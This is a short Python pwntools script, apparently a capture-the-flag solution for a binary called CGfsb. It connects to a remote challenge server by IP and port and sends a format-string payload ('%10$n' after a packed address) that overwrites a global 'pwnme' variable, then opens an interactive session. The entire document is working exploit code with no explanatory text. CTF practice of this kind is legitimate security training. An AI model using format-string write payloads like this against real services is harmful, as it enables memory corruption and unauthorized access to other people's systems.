from pwn import *

#r = process("./CGfsb")
r = remote("111.198.29.45", 34700)

pwnme_addr = 0x0804A068
payload = p32(pwnme_addr) + 'aaaa' + '%10$n'

r.recvuntil("please tell me your name:\n")
r.sendline('lucky')
r.recvuntil("leave your message please:\n")
r.sendline(payload)

r.interactive()
